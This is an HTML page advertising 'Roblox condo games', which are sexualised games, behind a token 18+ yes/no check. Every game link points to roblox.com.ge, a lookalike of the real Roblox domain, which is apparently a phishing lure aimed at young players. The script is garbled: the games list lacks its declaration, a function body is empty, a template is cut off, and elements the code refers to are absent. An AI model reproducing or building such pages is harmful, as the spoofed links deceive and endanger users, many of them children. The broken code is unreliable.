<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>ROBLOX CONDO GAMES</title>
<style>
  :root {
    --accent: #ff6600;
    --bg-dark: #000;
    --bg-light: #1a1a1a;
  }

  * {
    box-sizing: border-box;
    margin: 0;
    padding: 0;
  }

  body, html {
    height: 100%;
    font-family: Arial, Helvetica, sans-serif;
    background: radial-gradient(circle at center, #0b0c10, #000000);
    overflow: hidden;
    color: white;
  }

  /* Falling stars */
  .star {
    position: absolute;
    width: 2px;
    height: 2px;
    background: white;
    border-radius: 50%;
    animation: fall linear infinite;
  }

  @keyframes fall {
    0% { transform: translateY(-10px) translateX(0); opacity: 1; }
    100% { transform: translateY(100vh) translateX(20px); opacity: 0; }
  }

  /* Loading screen */
  #loadingScreen {
    position: fixed;
    inset: 0;
    background: black;
    display: flex;
    align-items: center;
    justify-content: center;
    flex-direction: column;
    z-index: 20;
  }
  #loadingScreen h1 {
    color: var(--accent);
    font-size: 2rem;
    margin-bottom: 20px;
  }
  .loader {
    border: 5px solid rgba(255,255,255,0.2);
    border-top: 5px solid var(--accent);
    border-radius: 50%;
    width: 60px;
    height: 60px;
    animation: spin 1s linear infinite;
  }
  @keyframes spin {
    to { transform: rotate(360deg); }
  }

  /* Verification modal */
  #overlay {
    position: fixed;
    inset: 0;
    background: rgba(0,0,0,0.9);
    display: none;
    align-items: center;
    justify-content: center;
    z-index: 15;
  }
  .modal {
    background: #111;
    padding: 25px 35px;
    border-radius: 12px;
    text-align: center;
    box-shadow: 0 0 20px var(--accent);
    max-width: 320px;
  }
  .modal h2 {
    font-size: 1.8rem;
    color: var(--accent);
    margin-bottom: 10px;
  }
  .modal p {
    margin-bottom: 18px;
    color: #ccc;
  }
  .modal-btn {
    padding: 10px 25px;
    border: none;
    margin: 5px;
    border-radius: 8px;
    font-weight: bold;
    cursor: pointer;
    font-size: 1rem;
    transition: all 0.3s ease;
  }
  .yes-btn {
    background: var(--accent);
    color: black;
  }
  .yes-btn:hover {
    background: #ff7c1a;
  }
  .no-btn {
    background: #444;
    color: white;
  }
  .no-btn:hover {
    background: #666;
  }

  /* Main content */
  .wrapper {
    max-width: 900px;
    margin: 60px auto;
    text-align: center;
    padding: 20px;
    position: relative;
    z-index: 5;
  }
  .header {
    font-size: 2.3rem;
    font-weight: 800;
    color: var(--accent);
    text-shadow: 0 0 10px var(--accent), 0 0 30px var(--accent);
    margin-bottom: 25px;
  }

  /* Game picker */
  #gamePicker {
    display: none;
    flex-wrap: wrap;
    justify-content: center;
    gap: 18px;
  }
  .game-card {
    padding: 14px 30px;
    border-radius: 10px;
    background: rgba(255, 102, 0, 0.1);
    border: 2px solid var(--accent);
    color: white;
    font-size: 1.1rem;
    font-weight: bold;
    cursor: pointer;
    box-shadow: 0 0 10px rgba(255,102,0,0.4);
    transition: all 0.3s ease;
    min-width: 200px;
    display: flex;
    justify-content: space-between;
    align-items: center;
  }
  .game-card:hover {
    background: rgba(255,102,0,0.3);
    transform: translateY(-4px);
    box-shadow: 0 0 20px var(--accent);
  }

  .arrow {
    font-size: 1.2rem;
    margin-left: 10px;
  }

  /* Discord button */
  .discord-btn {
    display: inline-block;
    margin-top: 40px;
    padding: 14px 40px;
    border-radius: 12px;
    background: var(--accent);
    color: black;
    font-weight: bold;
    text-decoration: none;
    box-shadow: 0 0 15px var(--accent), 0 0 40px rgba(255,102,0,0.5);
    transition: all 0.3s ease;
  }
  .discord-btn:hover {
    background: #ff7c1a;
    box-shadow: 0 0 25px var(--accent), 0 0 50px rgba(255,102,0,0.8);
  }

  /* Not eligible text */
  #notEligible {
    display: none;
    text-align: center;
    color: #ff4d4d;
    font-size: 1.3rem;
    font-weight: bold;
    margin-top: 20px;
  }
</style>
</head>
<body>

<!-- Loading Screen -->
<div id="loadingScreen">
  <h1>Loading...</h1>
  <div class="loader"></div>
</div>

<!-- Verification -->
<div id="overlay">
  <div class="modal">
    <h2>18+ Verification</h2>
    <p>Are you 18 or older?</p>
    <button class="modal-btn yes-btn" id="yesBtn">Yes</button>
    <button class="modal-btn no-btn" id="noBtn">No</button>
  </div>
</div>

<div class="wrapper">
  <div class="header">BEST ROBLOX CONDO GAMES</div>

</div>

<script>

function createStars(num) {

}
createStars(60);

/* Games list with links */

  { title: "Weird Neko Untitled Game", link: "https://roblox.com.ge/games/76106209840076/Weird-Neko-Untitled-Game?privateServerLinkCode=63776496008489733878933289493190" },
  { title: "Bubble Gum Simulator", link: "https://roblox.com.ge/games/18309026402/NEW-YEARS-Bubble-Gum-Simulator?privateServerLinkCode=63776496008489733878933289493190" },
  { title: "[NEW UPDATEüòç] Girl Weird Obby", link: "https://roblox.com.ge/games/139939943653096/NEW-Girl-Weird-Obby?privateServerLinkCode=63776496008489733878933289493190" },
  { title: "teleport to weird neko", link: "https://roblox.com.ge/games/102438880728881/Teleport-To-Weird-Neko?privateServerLinkCode=63776496008489733878933289493190" },
  { title: "steal obby vive", link: "https://roblox.com.ge/games/127188854693840/steal-obby-vibe?privateServerLinkCode=63776496008489733878933289493190" },

/* Load game cards */
function loadGames() {
  const picker = document.getElementById("gamePicker");
  picker.innerHTML = games.map(g =>

     </div>`
  ).join("");
}

/* Loading screen logic */
window.addEventListener("load", () => {
  setTimeout(() => {
    document.getElementById("loadingScreen").style.display = "none";
    document.getElementById("overlay").style.display = "flex";
  }, 3000);
});

/* Verification logic */
document.getElementById("yesBtn").addEventListener("click", () => {
  document.getElementById("overlay").style.display = "none";
  loadGames();
  document.getElementById("gamePicker").style.display = "flex";
});

document.getElementById("noBtn").addEventListener("click", () => {
  document.getElementById("overlay").style.display = "none";
  document.getElementById("notEligible").style.display = "block";
});
</script>
</body>
</html>
